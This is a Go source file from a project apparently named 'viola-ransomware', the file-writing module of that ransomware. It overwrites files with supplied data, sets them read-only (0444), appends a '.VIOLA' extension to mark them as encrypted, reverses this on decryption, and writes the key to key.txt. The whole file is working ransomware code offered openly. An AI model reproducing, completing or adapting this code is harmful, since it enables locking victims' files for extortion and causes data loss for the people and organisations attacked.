// for write file & convert extensions name

package readwrite

import (
	// "fmt"
	"io/fs"
	"os"
	"viola-ransomware/config"

	// "path/filepath"
	"strings"
)

var (
	changedToExtensions = config.ChangedToExtensions
	permission          = 0444
)

// changedToExtensions := ".VIOLA" // convert from original extensions to this ah name

// save key for decrypt
func SaveKey(key string) {
	keybyte := []byte(key)
	err := os.WriteFile("key.txt", keybyte, 0644)
	if err != nil {
		panic(err.Error())
	}
}

func WriteFilesNoExt(data string, path string) bool {
	bytedata := []byte(data)
	err := os.WriteFile(path, bytedata, 0644)
	return err == nil
}

func ConvertExtensionsName(path string, decrypt bool) bool {
	newFileExt := path + changedToExtensions

	if decrypt {
		if strings.HasSuffix(path, changedToExtensions) {
			newFileExt = strings.TrimSuffix(path, changedToExtensions)
		}
	}

	err := os.Rename(path, newFileExt)

	return err == nil
}

func WriteFiles(data string, path string, decrypt bool) bool {
	bytedata := []byte(data)
	if decrypt {
		permission = 0644
	}
	err := os.WriteFile(path, bytedata, fs.FileMode(permission))
	if err != nil {
		return false
	}

	if !ConvertExtensionsName(path, decrypt) {
		return false
	}

	return true
}
